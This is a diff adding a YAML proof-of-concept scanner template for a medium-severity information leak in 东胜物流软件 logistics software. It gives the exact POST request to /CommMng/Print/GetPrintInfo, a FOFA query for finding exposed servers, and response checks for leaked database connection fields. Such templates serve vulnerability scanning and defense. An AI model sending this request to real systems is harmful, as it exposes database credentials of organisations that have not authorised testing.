@@ -1,0 +1,18 @@
+id: poc-yaml-dongshengsoft-getprintinfo-info-leak
+info:
+  name: 东胜物流软件 GetPrintInfo 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+requests:
+- method: POST
+  path: /CommMng/Print/GetPrintInfo
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
+  expression: status_code == 200 && contains(body,"\"Success\"\x3a true") && contains(body,"\"DbSourceID\":")
+    && contains(body,"\"PrServer\":") && contains(body,"\"dbStr\":") && !contains(body,"<")
+variables: {}
+transport: http
